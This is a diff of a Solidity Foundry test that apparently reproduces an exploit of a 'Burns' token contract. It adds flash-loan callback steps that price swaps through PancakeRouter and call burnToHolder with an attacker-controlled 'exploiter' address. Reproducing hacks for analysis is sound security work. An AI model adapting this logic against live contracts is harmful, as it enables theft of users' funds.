@@ -6,7 +6,7 @@ import "../src/interface/interface.sol";
 import "forge-std/console2.sol";
 
 interface IBurnsBuild {
-    function burnToHolder() external;
+    function burnToHolder(uint256 amount, address _invitation) external;
 
     function receiveRewards(address to) external;
 }
@@ -80,6 +80,17 @@ contract ContractTest is Test {
         bytes calldata data
     ) external {
         BUSDTToBurns(baseAmount);
+
+        address[] memory path = new address[](2);
+        path[0] = address(Burns);
+        path[1] = address(WBNB);
+        uint256 amountOut1 = 50e18;
+        uint256 amountOut2 = address(Burns).balance - amountOut1;
+        uint256[] memory amounts = PancakeRouter.getAmountsIn(amountOut1, path);
+
+        BurnsBuild.burnToHolder(amounts[0], exploiter);
+        amounts = PancakeRouter.getAmountsIn(amountOut2, path);
+        //console2.log("amounts: ", amounts);
     }
 
     function BUSDTToBurns(uint256 amount) private {
